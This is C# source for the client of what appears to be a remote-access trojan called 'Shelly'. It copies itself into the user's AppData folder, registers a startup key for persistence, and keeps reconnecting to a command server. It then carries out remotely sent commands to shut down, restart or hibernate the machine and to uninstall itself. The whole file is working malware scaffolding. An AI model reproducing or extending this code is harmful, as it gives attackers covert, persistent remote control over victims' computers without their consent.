using System;
using System.IO;
using System.Reflection;
using System.Threading;

namespace Shelly_Client
{
    class Program
    {
        public const string ServerIp = "127.0.0.1";
        public const int ServerPort = 8500;

        // Get initial execution path
        public static string ExecutionPath = Directory.GetCurrentDirectory();

        // Get appdata path
        public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        static void Main(string[] args)
        {
            // Check if program is launched in system32 NOTE: Happens at startup
            if (ExecutionPath == Environment.SystemDirectory)
            {
                // Add startup key
                InstallFunctions.StartupKey("Add");

                // Change path
                Directory.SetCurrentDirectory(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location));

                // Set execution path to current path
                ExecutionPath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            }

            // Check if file is installed, if not, install it
            if (ExecutionPath == Appdata + @"\Shelly")
            {
                TryToConnect:

                // Try to connect
                try
                {
                    SocketHandler.Connect();
                }
                catch
                {
                    // Wait, try again
                    Thread.Sleep(5000);
                    goto TryToConnect;
                }

                // Infinite loop
                while (true)
                {
                    // Try to read data
                    try
                    {
                        // Read data
                        switch (SocketHandler.Receive())
                        {
                            // Uninstall shell
                            case "uninstall":

                                // Disconnect
                                SocketHandler.Disconnect();

                                // Uninstall
                                InstallFunctions.Uninstall();

                                // Exit
                                Environment.Exit(0);
                                break;


                            // Send ping to server
                            case "disconnect":

                                // Disconnect and exit
                                ShutdownClient();
                                break;

                            // Send ping to server
                            case "ping":

                                // Send message
                                SocketHandler.Send(Functions.General.Ping());
                                break;

                            // Send ping to server
                            case "shutdown":

                                // Shutdown
                                Functions.PowerOptions.Shutdown();

                                // Disconnect and exit
                                ShutdownClient();
                                break;

                            // Send ping to server
                            case "restart":
                                Functions.PowerOptions.Restart();

                                // Disconnect and exit
                                ShutdownClient();
                                break;

                            // Send ping to server
                            case "hibernate":
                                Functions.PowerOptions.Hibernate();

                                // Disconnect
                                SocketHandler.Disconnect();
                                break;
                        }
                    }
                    catch
                    {
                        // Disconnect
                        SocketHandler.Disconnect();

                        // Goto TryToConnect
                        goto TryToConnect;
                    }
                }

            } else
            {
                // Install
                InstallFunctions.Install();

                // Exit
                Environment.Exit(0);
            }
        }

        public static void ShutdownClient()
        {
            // Disconnect
            SocketHandler.Disconnect();

            // Exit
            Environment.Exit(0);
        }
    }
}
